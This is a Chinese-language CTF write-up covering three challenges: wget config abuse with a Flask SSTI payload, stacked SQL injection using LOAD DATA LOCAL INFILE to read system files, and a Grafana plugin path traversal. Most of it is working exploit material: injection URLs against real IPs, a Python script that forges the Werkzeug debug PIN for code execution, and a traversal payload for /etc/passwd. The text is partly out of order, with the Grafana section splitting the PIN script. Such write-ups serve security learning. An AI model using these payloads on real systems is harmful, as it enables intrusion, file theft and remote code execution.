http_proxy = string
Use string as HTTP proxy, instead of the one specified in environment.
output_document = file
Set the output filename—the same as ‘-O file’.
控制返回内容为
http_proxy=http://xxxxx
output_document = templates/index.html
{{config.__class__.__init__.__globals__['os'].popen('反弹shell').read()}}
import requests
def web():
    url = "http://xxx/"
    r = requests.post(url + "forecast",
                      files={'file': 
open("/Users/y4tacker/PycharmProjects/pythonProject/lottt/y4.txt", "rb")})
    data = {
        "lotto_key": "WGETRC",
        "lotto_value": "/app/guess/forecast.txt"
    }
    r = requests.post(url + "lotto", data=data)
    print(r.text)
if __name__ == '__main__':
    web()
oh-my-notepro
好吧又是⿊盒，烦死了
登录后，只有⼀个创建note的功能点，先是测试了下各种SSTI的payload没啥反应，之后猜测
是不是要获取到admin的noteid，⾸先看到这种又臭又
长 0pn2jtgnfer9zaijadymsmq347eqmay3 的字符肯定是不能爆破，尝试sql注⼊，经典单引
号报错
尝试回显有五列，但是payload这么简单，毕竟是XCTF肯定不可能sql注⼊就能从数据库拖出
flag(⼤概率⽆过滤是不可能这么简单的)，当然也确实验证了没有flag，甚⾄没有admin⽤户
接下来尝试load_file读⽂件也不⾏，后⾯想去看看⼀些配置信息，⼀般我们通过类似 show 
variables like xxx 这样去读，但是其实也可以直接通过sql语句拿到global当中的信息
好吧真拿你没办法洛
后⾯发现local_infile开了，不知道这是啥可以看看CSS-T | Mysql Client 任意⽂件读取攻击链拓
展
select @@global.secure_file_priv
那么要利⽤肯定常规的注⼊不⾏，只有⼀个东西能满⾜，那就是堆叠注⼊，简单验证下
页⾯确实有延时那验证了我们的猜想，接下来读⽂件
果然可以bro
那么想要rce只剩⼀个⽅法咯，都有报错页⾯了，算算pin呗
需要：
1.flask所登录的⽤户名
http://123.60.72.85:5002/view?note_id=0' union select 1,2,3,4,5;select 
sleep(2)--+
http://123.60.72.85:5002/view?note_id=0' union select 1,2,3,4,5; create 
table y4(t text); load data local infile '/etc/passwd' INTO TABLE y4 LINES 
TERMINATED BY '\n'--+
2.modname-⼀般固定为flask.app
3.getattr(app, “name”, app.class.name) - 固定，⼀般为Flask
4.在flask库下app.py的绝对路径，通过报错泄漏
5.当前⽹络的mac地址的⼗进制数
6.docker机器id
⽹上直接抄了⼀个发现不对，简单看了flask⽣成pin码的地⽅，在 python3.8/site-
packages/werkzeug/debug/__init__.py#get_pin_and_cookie_name
发现python3.8以后从原来的md5改成了sha1
那简单写个利⽤脚本就好了呗
import requests
import re
import hashlib
from itertools import chain
url = "http://124.70.185.87:5002/view?note_id="
payload1 = "0' union select 1,2,3,4,5; create table y4(t text); load data 
local infile '/sys/class/net/eth0/address' INTO TABLE y4 LINES TERMINATED 
BY '\\n'--+"
payload2 = "0' union select 1,2,3,4,5; create table yy4(t text); load data 
local infile '/proc/self/cgroup' INTO TABLE yy4 LINES TERMINATED BY '\\n'-
-+"
payload3 = "0' union select 1,2,3,(select group_concat(t) from y4),1; --+"
payload4 = "0' union select 1,2,3,(select group_concat(t) from yy4),1; --
+"
headers = {
    "cookie":"session=.eJwVi0EKwyAQAL8ie8mlEE3ArP1MWXdXCE21REsJpX-
POcxlhvkB1z09WnlqhjvMkwvKHBktRmfD5J1NKj5EXBDZeppVAi5wg0_VPdNL-
7UVEiPUyKw5rZuaYdTG45tq_crQZSumUezhOKRewP8E760nRw.YlqN-
g.KZrp8S7tsXPS60cPH88awzRI35Q"
}
r = requests.get(url+payload1,headers=headers)
r = requests.get(url+payload2,headers=headers)
probably_public_bits = [
    'ctf'# /etc/passwd
    'flask.app',# 默认值
    'Flask',# 默认值
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到
]
private_bits = [
    str(int(re.search('(.*?)
',requests.get(url+payload3,headers=headers).text.replace("\n", 
"").replace(" ","")).groups()[0].replace(':',''),16)),#  
/sys/class/net/eth0/address 16进制转10进制
    '1cc402dd0e11d5ae18db04a6de87223d'+re.search('(.*?)
',requests.get(url+payload4,headers=headers).text.replace("\n", 
"").replace(" ","")).groups()[0].split(",")[0].split("/")[-1]#  
/etc/machine-id + /proc/self/cgroup
]
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
oh-my-grafana
之前被爆有任意⽂件读，不知道有啥插件简单fuzz⼀下得到
⼤概看了下⽂档看看能读些什么配置
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
cookie_name = '__wzd' + h.hexdigest()[:20]
num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num
print(rv)
/public/plugins/alertGroups/../../../../../../../../etc/passwd
先是读了sqlite，dump下来想看看admin密码来着，尝试很多没破解成功，显然是我不懂密码
学
不过后⾯看到了 grafana.ini ，⾥⾯泄漏了，好吧还成功登陆了
后台啥都⽆，不过有个添加数据源的地⽅，显然这⾥被注释了，但是真的链接成功了
后⾯就是任意执⾏sql语句拿下了，没啥难度